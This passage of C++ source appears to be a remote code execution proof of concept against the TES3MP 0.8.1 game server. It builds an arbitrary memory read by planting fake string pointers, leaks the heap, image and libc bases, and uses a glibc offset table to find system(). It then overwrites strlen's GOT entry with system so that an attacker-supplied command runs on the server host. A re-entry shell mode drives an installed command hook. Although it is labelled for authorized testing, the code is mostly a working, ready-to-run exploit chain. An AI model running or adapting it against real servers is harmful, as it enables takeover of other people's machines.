            if (p->data[0] != ID_PLAYER_EQUIPMENT) continue;
            BitStream rd(p->data, p->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            // The relay carries the GUID of the player whose equipment changed. Only ours can be
            // a leak; anyone else's is another player's real inventory landing in our result.
            if (g_srcKnown && g != g_srcGuid) { g_foreign++; continue; }
            bool full = false; rd.Read(full); if (full) continue;
            uint32_t cn = 0; rd.Read(cn); if (cn != 1) continue;
            int wi = 0; rd.Read(wi); RakString rs; rs.DeserializeCompressed(&rd);
            int c1 = 0, c2 = 0; rd.Read(c1); rd.Read(c2);
            oi = wi; w = ((uint64_t)(uint32_t)c2 << 32) | (uint32_t)c1;
        }
        usleep(40000);
    }
    return w;
}

static void drainboth(Cli &A, Cli &R, int ms)
{
    for (int i = 0; i < ms / 20; i++) {
        for (Packet *p = A.peer->Receive(); p; A.peer->DeallocatePacket(p), p = A.peer->Receive());
        for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
        usleep(20000);
    }
}

// ID_PLAYER_CELL_CHANGE makes the server re-serialize the whole equipment array from storage to
// every peer in the cell. The send path only reads refId, so a planted pointer is not disturbed.
static void cellChange(Cli &c, const char *cn)
{
    BitStream bs; hdr(c, bs, ID_PLAYER_CELL_CHANGE);
    CellData12 md{0, 0, 0}; bs.WriteCompressed(md);
    RakString cs = rstr(cn); RakString::SerializeCompressed(cs.C_String(), &bs);
    Pos3 pp{{0, 0, 0}}; bs.WriteCompressed(pp);
    bool region = false; bs.Write(region);
    snd(c, bs); usleep(200000);
}

// One 8-byte read. `ok` separates "the relay arrived and the string was empty" from "no relay
// arrived": both used to return 0, so a legitimately-zero read polled for ten seconds and then
// reported an indistinguishable failure. Keeping the observed length is what lets a caller treat
// a zero-length answer as "this byte is 0x00" rather than as an error, which is the whole basis
// of the NUL-transparent shifted read.
struct ReadResult { bool ok; size_t len; uint64_t val; };

static ReadResult harvestFull(Cli &R, int k)
{
    for (int i = 0; i < 250; i++) {
        for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive()) {
            if (p->data[0] != ID_PLAYER_EQUIPMENT) continue;
            BitStream rd(p->data, p->length, false);
            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
            if (g_srcKnown && g != g_srcGuid) { g_foreign++; continue; }
            bool full = false; rd.Read(full); if (!full) continue;
            // Latch on the FIRST full relay of ours after the trigger, whatever it says. The old
            // code latched on a non-zero value, which silently turned an empty read into a timeout.
            ReadResult r{true, 0, 0};
            for (int it = 0; it < 19; it++) {
                RakString rs; rs.DeserializeCompressed(&rd);
                int cnt = 0, chg = 0; float ench = 0; rd.Read(cnt); rd.Read(chg); rd.Read(ench);
                const char *s = rs.C_String(); size_t n = rs.GetLength();
                uint64_t v = 0; for (size_t b = 0; b < n && b < 8; b++) v |= ((uint64_t)(unsigned char)s[b]) << (8 * b);
                if (it == k) { vlog("[item %d len=%zu value=%#llx]\n", it, n, (unsigned long long)v); r.len = n; r.val = v; }
            }
            for (Packet *q = R.peer->Receive(); q; R.peer->DeallocatePacket(q), q = R.peer->Receive());
            return r;
        }
        usleep(40000);
    }
    return ReadResult{false, 0, 0};
}

// ARBITRARY READ. Plant a fake std::string {_M_p = target, _M_len = 8} in eq[k].refId, trigger the
// full-info relay, and the server serializes 8 bytes read from `target` straight to the reader.
// Written byte-wise: the chat write is strlen-truncated, so a target containing an internal NUL
// would silently truncate a single 6-byte write.
static ReadResult aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
{
    uint64_t eqk = eq + P.item_stride * k;
    for (int i = 0; i < 6; i++) {
        unsigned char b = (unsigned char)((tgt >> (8 * i)) & 0xff);
        redirect(A, eqk + i);
        if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
    }
    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
    { unsigned char e = 8; redirect(A, eqk + 8); sendChatBytes(A, &e, 1); }
    for (int z = 10; z < 16; z++) { redirect(A, eqk + z); sendChatBytes(A, (const void *)"", 0); }
    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
    drainboth(A, R, 1200);          // RELIABLE_ORDERED only orders within one channel; let the plant land first
    cellChange(A, cell);
    ReadResult r = harvestFull(R, k);
    // restore _M_p to the string's own SSO buffer so no destructor frees a wild pointer
    { uint64_t sso = eqk + 16;
      for (int i = 0; i < 6; i++) {
          unsigned char b = (unsigned char)((sso >> (8 * i)) & 0xff);
          redirect(A, eqk + i);
          if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
      } }
    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
    { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
    return r;
}

static ReadResult RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }

// Remote libc base, no files. The read is strlen-truncated so it cannot read a page-aligned VALUE (low byte
// 0x00) -- which rules out walking the loader's link_map (l_addr is a load base). But &malloc IS readable
// (libc+0xad..., non-zero low byte), and the libc base carries the ELF magic \x7fELF, whose first byte 0x7f
// is also readable. So mask &malloc down to a load alignment and confirm the magic; fall back to a bounded
// page scan. Modern glibc is 2 MiB-aligned, so this is typically two reads.
static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, uint64_t image, uint64_t &mallocPtrOut)
{
    uint64_t mp = RD(A, R, eq, image + P.malloc_got, cell).val;  // &malloc (readable)
    mallocPtrOut = mp;
    if (mp < 0x10000) return 0;
    for (uint64_t a = 0x200000; a >= 0x1000; a >>= 1) {          // 2 MiB, 1 MiB, ... 4 KiB
        uint64_t c = mp & ~(a - 1);
        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
    }
    for (uint64_t c = mp & ~0xfffULL; c + 0x400000 > mp; c -= 0x1000)   // bounded page scan fallback
        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
    return 0;
}

// A tiny table of glibc builds keyed by malloc's offset (which we compute remotely as &malloc - libc_base),
// mapping to system's offset. This is public per-build data, not anything from the target: an attacker fills
// it from the distro's own libc packages. Unknown builds fall back to --libc / --system-off.
struct GlibcBuild { uint64_t malloc_off, system_off; const char *note; };
static GlibcBuild g_glibc[] = {
    // Ubuntu 24.04, glibc 2.39-0ubuntu8.x. Offsets read from the public libc6 packages, keyed by malloc's
    // offset (which we compute remotely). system's offset is what we actually need. Extend as builds appear.
    { 0xad640, 0x58740, "glibc 2.39-0ubuntu8.0-8.3 (Ubuntu 24.04)" },
    { 0xad650, 0x58750, "glibc 2.39-0ubuntu8.4-8.6 (Ubuntu 24.04)" },
    { 0xad670, 0x58750, "glibc 2.39-0ubuntu8.7 (Ubuntu 24.04)" },
    { 0xad750, 0x58750, "glibc 2.39-0ubuntu8.8 (Ubuntu 24.04)" },
};

static void usage(const char *a0)
{
    fprintf(stderr,
      "tes3mp-rce - remote code execution PoC for TES3MP 0.8.1 (authorized testing only)\n\n"
      "usage: %s [options] <host> [port]\n\n"
      "  -P, --server-password <pw>  server password, i.e. the `password` setting in\n"
      "                              tes3mp-server-default.cfg. Default: \"blankpassword\", which is\n"
      "                              what the server itself substitutes for an empty setting, so an\n"
      "                              unpassworded target is joined without a log line. NOT an account.\n"
      "  -c, --command <cmd>         command to run on the server host\n"
      "                              (default: touch /tmp/tes3mp-rce-proof)\n"
      "  -t, --token <tok>           RakNet connect token: TES3MP_VERSION + PROTO_VERSION + commitHash.\n"
      "                              Public per build, not a secret. Default: 0.8.1 release.\n"
      "  -b, --bind <ip>             local address for the second (reader) client (default 127.0.0.2)\n"
      "  -n, --name <base>           player name prefix (default: rce)\n"
      "  -C, --cell <name>           cell to meet in (default: ExploitCell-<random>, so runs stay isolated)\n"
      "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
      "                              Touches no server memory: safe to run against a live server.\n"
      "  -s, --shell                 RE-ENTRY mode. Does NOT exploit anything: connects as an ordinary\n"
      "                              client and drives a command hook that is ALREADY installed. Use\n"
      "                              after a server restart, or to avoid re-running the chain. With -c\n"
      "                              it runs one command and exits; otherwise it is interactive.\n"
      "                              Unlike the exploit path this DOES need an account, because\n"
      "                              CoreScripts gates chat on IsLoggedIn(); it registers on first use\n"
      "                              and so leaves data/player/<name>.json on the target.\n"
      "  -A, --account-pass <pw>     account password for -s (default: rce-poc-pw-1)\n"
      "  -O, --bot                   LOAD GENERATOR. Join a cell as an ordinary client and send\n"
      "                              in-bounds equipment changes forever. Exploits nothing. Exists to\n"
      "                              put a second player's relays in the cell so the GUID filter can be\n"
      "                              tested. -I sets the interval ms, -X the in-bounds index.\n"
      "  -F, --profile <file>        load a target profile (layout + RVAs). tools/gen-profile derives\n"
      "                              the layout half from a TES3MP tree; -B derives the RVA half from\n"
      "                              the target binary and overrides what the profile supplied.\n"
      "  -B, --server-bin <path>     read the vtable/strlen@got/malloc@got RVAs from a copy of the TARGET's\n"
      "                              tes3mp-server.x86_64. Needed only if the target is not the stock 0.8.1.\n"
      "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
      "                              Needed unless the target runs the same glibc build as the defaults.\n"
      "                              scp both off the box:\n"
      "                                scp user@target:/lib/x86_64-linux-gnu/libc.so.6 .\n"
      "                                scp user@target:/path/to/tes3mp-server.x86_64 .\n"
      "  -M, --malloc-off <hex>      override malloc offset in libc (default 0xad750, glibc 2.39-0ubuntu8.8)\n"
      "  -S, --system-off <hex>      override system offset in libc (default 0x58750)\n"
      "  -v, --verbose               show relay parsing\n"
      "  -h, --help                  this text\n\n"
      "Payload must exit 0 to leave the server running: strlen's return value becomes the command's\n"
      "exit status, and a nonzero status is then used as a string length elsewhere.\n", a0);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, 0, _IONBF, 0);
    const char *cmd = "touch /tmp/tes3mp-rce-proof";
    // Reader binds to "any" by default. A Linux-only loopback alias like 127.0.0.2 does not exist on
    // macOS (lo0 has only 127.0.0.1) and cannot route to a remote server anyway; "" lets the OS pick the
    // egress interface, so A and R simply get two source ports from the same address, which the server
    // keys apart by SystemAddress. Override with -b only if you specifically need a fixed source address.
    const char *bind2 = "", *nameBase = "rce";
    // Randomised so two runs never share a cell, and so a real player cannot wander into ours and
    // have their equipment relays parsed as our leak. Belt and braces with the GUID filter below.
    char cellbuf[64];
    { unsigned seed = (unsigned)getpid() ^ (unsigned)time(0);
      snprintf(cellbuf, sizeof cellbuf, "ExploitCell-%06x", seed & 0xffffff); }
    const char *cell = cellbuf;
    int shellMode = 0; const char *acctPass = "rce-poc-pw-1";
    static struct option lo[] = {
        {"shell", no_argument, 0, 's'}, {"account-pass", required_argument, 0, 'A'},
        {"server-password", required_argument, 0, 'P'}, {"command", required_argument, 0, 'c'},
        {"token", required_argument, 0, 't'}, {"bind", required_argument, 0, 'b'},
        {"name", required_argument, 0, 'n'}, {"cell", required_argument, 0, 'C'},
        {"probe", no_argument, 0, 'p'},
        {"libc", required_argument, 0, 'L'}, {"server-bin", required_argument, 0, 'B'},
        {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
        {"profile", required_argument, 0, 'F'},
        {"bot", no_argument, 0, 'O'}, {"bot-interval", required_argument, 0, 'I'},
        {"bot-index", required_argument, 0, 'X'},
        {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
    const char *libcPath = 0, *serverBin = 0, *profPath = 0;
    int botMode = 0, botInterval = 700, botIndex = 3;
    int mGiven = 0, sGiven = 0;
    int c;
    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:F:OI:X:vh", lo, 0)) != -1) {
        switch (c) {
            case 'P': g_srvpass = optarg; break;
            case 'c': cmd = optarg; break;
            case 't': g_token = optarg; break;
            case 'b': bind2 = optarg; break;
            case 'n': nameBase = optarg; break;
            case 'C': cell = optarg; break;
            case 'p': g_probe = 1; break;
            case 's': shellMode = 1; break;
            case 'A': acctPass = optarg; break;
            case 'L': libcPath = optarg; break;
            case 'B': serverBin = optarg; break;
            case 'F': profPath = optarg; break;
            case 'O': botMode = 1; break;
            case 'I': botInterval = atoi(optarg); break;
            case 'X': botIndex = atoi(optarg); break;
            case 'M': P.malloc_off = strtoull(optarg, 0, 0); mGiven = 1; break;
            case 'S': P.system_off = strtoull(optarg, 0, 0); sGiven = 1; break;
            case 'v': g_verbose = 1; break;
            default: usage(argv[0]); return 2;
        }
    }
    if (optind < argc) g_host = argv[optind++];
    if (optind < argc) g_port = atoi(argv[optind++]);

    if (botMode) {
        printf("[*] bot -> %s:%d, cell %s. Generates ordinary in-bounds equipment traffic; exploits nothing.\n",
               g_host, g_port, cell);
        fingerprint();
        return runBot(nameBase, cell, botInterval, botIndex);
    }

    if (shellMode) {
        int cmdGiven = 0;
        for (int i = 1; i < argc; i++)
            if (!strcmp(argv[i], "-c") || !strcmp(argv[i], "--command")) cmdGiven = 1;
        printf("[*] re-entry client -> %s:%d (account '%s'). Hook must already be installed; nothing is exploited.\n",
               g_host, g_port, nameBase);
        fingerprint();
        return runShell(nameBase, acctPass, cmdGiven ? cmd : 0);
    }

    if (profPath && !loadProfile(profPath)) return 2;
    if (serverBin) {
        if (!readServerBin(serverBin, P.vtable_rva, P.strlen_got, P.malloc_got)) {
            printf("[!] could not read RVAs from %s\n", serverBin); return 2;
        }
        printf("[*] server %s: vtable@%#llx strlen@got=%#llx malloc@got=%#llx\n", serverBin,
               (unsigned long long)P.vtable_rva, (unsigned long long)P.strlen_got, (unsigned long long)P.malloc_got);
    }
    if (libcPath) {
        if (!readLibcOffsets(libcPath, P.malloc_off, P.system_off)) {
            printf("[!] could not read libc offsets from %s\n", libcPath); return 2;
        }
        printf("[*] libc %s: malloc@%#llx system@%#llx\n", libcPath,
               (unsigned long long)P.malloc_off, (unsigned long long)P.system_off);
    }
    if (!serverBin) printf("[*] server RVAs: baked-in defaults for the distributed 0.8.1 build (pass --server-bin <tes3mp-server.x86_64> to derive)\n");
    if (!libcPath)  printf("[*] libc offsets: baked-in defaults for glibc 2.39-0ubuntu8.8 (pass --libc <libc.so.6> if the target's glibc differs)\n");

    printf("[*] target %s:%d   server-password: %s\n", g_host, g_port,
           *g_srvpass ? "supplied" : "(none, upstream default)");
    printf("[*] payload: %s\n", cmd);

    fingerprint();
    std::string nA = std::string(nameBase) + "A", nR = std::string(nameBase) + "R";
    Cli A{}, R{};
    if (!connectTo(A, "")) { printf("[!] client A could not connect\n"); return 1; }
    g_srcGuid = A.peer->GetMyGUID(); g_srcKnown = true;
    handshake(A, nA.c_str());
    if (!connectTo(R, bind2)) { printf("[!] client R could not connect\n"); return 1; }
    handshake(R, nR.c_str());
    if (!stillConnected(A) || !stillConnected(R)) {
        printf("[!] kicked during handshake. %s\n", *g_srvpass
               ? "The server password supplied with -P was rejected."
               : "This server is password-protected: supply it with -P.");
        return 4;
    }
    loadCell(A, cell); loadCell(R, cell); drainboth(A, R, 600);
    printf("[+] both clients POSTLOADED in %s (no account, never logged in)\n", cell);

    if (g_probe) {
        printf("[probe] reachable and handshake accepted. Both clients are in-cell.\n");
        printf("[probe] profile: vtable@%#llx strlen@got=%#llx malloc@got=%#llx  (%s)\n",
               (unsigned long long)P.vtable_rva, (unsigned long long)P.strlen_got,
               (unsigned long long)P.malloc_got, serverBin ? serverBin : "baked-in 0.8.1 defaults");
        printf("[probe] libc:    %s\n", libcPath ? libcPath
               : (sGiven ? "--system-off override" : "build table, keyed on the remote malloc offset"));
        printf("[probe] mitigations: %s\n", serverBin
               ? "checked against the supplied binary (partial RELRO + libstdc++ required)"
               : "NOT CHECKED -- pass --server-bin to verify RELRO and the std::string ABI");
        if (g_foreign) printf("[probe] %lu foreign equipment relays already seen: this cell is NOT empty.\n", g_foreign);
        printf("[probe] this is the point the exploit begins; stopping here without touching server memory.\n");
        printf("[probe] drop -p (and set -c) to run the full chain.\n");
        return 0;
    }

    // 1. a live heap pointer (chatMessage's buffer). Not the base: only a valid writable address.
    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
    truncEq(A, (int)P.leak_heap_idx); int oi; uint64_t heap = harvest(R, oi);
    if (heap < 0x100000000ULL) { printf("[!] heap leak failed\n"); return 3; }
    printf("[+] heap scratch pointer  %#llx\n", (unsigned long long)heap);

    // 2. park it in animation.mode|count so index 28's clobber writes its NUL terminator somewhere safe
    { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY); RakString gn("");
      bs.Write(gn); int mo = (int)(heap & 0xffffffff), cn = (int)(heap >> 32);
      bs.Write(mo); bs.Write(cn); bool ps = false; bs.Write(ps); snd(A, bs); } usleep(200000);

    // 3. the real object base, from creatureRefId's self-pointer
    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
    truncEq(A, (int)P.leak_self_idx); uint64_t l28 = harvest(R, oi);
    { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY); RakString gn(""); bs.Write(gn);
      int z = 0; bs.Write(z); bs.Write(z); bool ps = false; bs.Write(ps); snd(A, bs); } usleep(150000);
    if (l28 < 0x100000000ULL) { printf("[!] base leak failed\n"); return 3; }
    uint64_t base = l28 - P.self_ptr_delta, eq = base + P.equip_off;
    printf("[+] BasePlayer base      %#llx\n", (unsigned long long)base);

    // 4. image base, from the Player vtable pointer at base-8
    sendChatStr(A, std::string(400, 'Z')); drainboth(A, R, 200);   // prime chatMessage (heap buffer, capacity >= 400)
    uint64_t v = aread(A, R, eq, 7, base - 8, cell).val;
    uint64_t pie = v > 0x100000000ULL ? v - P.vtable_rva : 0;
    if (!pie || (pie & 0xfff)) { printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v); return 3; }
    printf("[+] image base           %#llx  (page aligned)\n", (unsigned long long)pie);

    // 5. libc base + system(). The base is derived remotely and file-free: mask &malloc down to a load
    //    alignment and confirm the ELF magic (remoteLibcBase). system's OFFSET is not derived; it comes
    //    from the build table keyed on the remotely-computed malloc offset, or from --system-off/--libc.
    //    A link_map walk would give both, but l_addr is page-aligned and the read is strlen-truncated,
    //    so it reads back as an empty string. Fixing that needs the shifted read (fork 4), not a table.
    uint64_t sgot = pie + P.strlen_got;
    // libc base: derived remotely and file-free (mask &malloc to a load alignment, confirm the ELF magic).
    // --malloc-off forces the subtraction path instead, for a glibc whose load alignment defeats the scan.
    uint64_t libc = 0, mp = 0;
    if (mGiven) { mp = aread(A, R, eq, 7, pie + P.malloc_got, cell).val; libc = mp > 0x100000000ULL ? mp - P.malloc_off : 0; }
    else        { libc = remoteLibcBase(A, R, eq, cell, pie, mp); }
    if (!libc || (libc & 0xfff)) { printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp); return 3; }
    uint64_t moff = mp - libc;
    printf("[+] libc base            %#llx  (page aligned; malloc offset %#llx)\n", (unsigned long long)libc, (unsigned long long)moff);
    // system offset: explicit override, then --libc file, then the build table keyed by the malloc offset.
    uint64_t soff = 0; const char *ssrc = 0;
    if (sGiven)        { soff = P.system_off; ssrc = "--system-off"; }
    else if (libcPath) { soff = P.system_off; ssrc = libcPath; }
    else { for (unsigned i = 0; i < sizeof(g_glibc) / sizeof(g_glibc[0]); i++) if (g_glibc[i].malloc_off == moff) { soff = g_glibc[i].system_off; ssrc = g_glibc[i].note; break; } }
    if (!soff) {
        printf("[!] glibc build not recognized (malloc offset %#llx).\n", (unsigned long long)moff);
        printf("    Supply system's offset: --system-off <hex>, or --libc <the matching public libc.so.6>.\n");
        printf("    It is public per-distro data (e.g. the Ubuntu libc6 package), not anything off the target.\n");
        return 3;
    }
    uint64_t sys = libc + soff;
    printf("[+] system()             %#llx  (%s)\n", (unsigned long long)sys, ssrc);
    printf("[+] strlen@got           %#llx\n", (unsigned long long)sgot);

    // 6. aim eq[7].refId at strlen@got. capacity must exceed the value we are about to assign,
    //    or _M_replace takes the reallocating path and free()s the GOT address itself.
    uint64_t eqk = eq + P.item_stride * 7;
    for (int i = 0; i < 6; i++) {
        unsigned char b = (unsigned char)((sgot >> (8 * i)) & 0xff);
        redirect(A, eqk + i);
        if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
    }
    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
    { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
    { unsigned char cap = 0x40; redirect(A, eqk + 16); sendChatBytes(A, &cap, 1); }
    drainboth(A, R, 400);

    // 7. one packet, two items. Item 7's assignment writes `system` into strlen@got; item 5's
    //    assignment then calls the hijacked strlen on the payload. Both indices are in bounds.
    { BitStream bs; hdr(A, bs, ID_PLAYER_EQUIPMENT);
      bs.Write(false); uint32_t two = 2; bs.Write(two);
      int i7 = 7; bs.Write(i7);
      uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
      RakString r7 = rstr(sb); RakString::SerializeCompressed(r7.C_String(), &bs);
      int one = 1, zero = 0; bs.Write(one); bs.Write(zero); bs.Write(zero);
      int i5 = 5; bs.Write(i5);
      RakString r5 = rstr(cmd); RakString::SerializeCompressed(r5.C_String(), &bs);
      bs.Write(one); bs.Write(zero); bs.Write(zero);
      snd(A, bs); }
    printf("[+] trigger sent: strlen@got <- system, then strlen(\"%s\")\n", cmd);
    drainboth(A, R, 3000);
    printf("[*] done. If the target is vulnerable the command has run as the server's user.\n");
    if (g_foreign)
        printf("[!] %lu equipment relays from OTHER players were dropped during this run.\n"
               "    They were not parsed as leak data, but the cell was not empty, so the heap was\n"
               "    being churned by someone else while the chain groomed it. Treat a failure here as\n"
               "    inconclusive rather than as evidence the target is not vulnerable.\n", g_foreign);
    return 0;
}
